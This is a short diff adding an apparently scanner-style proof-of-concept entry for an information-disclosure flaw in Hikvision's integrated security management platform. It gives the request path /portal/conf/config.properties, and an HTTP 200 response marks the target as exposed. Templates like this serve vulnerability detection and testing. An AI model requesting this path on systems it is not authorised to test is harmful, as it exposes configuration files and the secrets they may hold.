@@ -1,0 +1,3 @@
+name: "海康威视综合安防管理平台信息泄露"
+poc: "/portal/conf/config.properties"
+status_code: 200
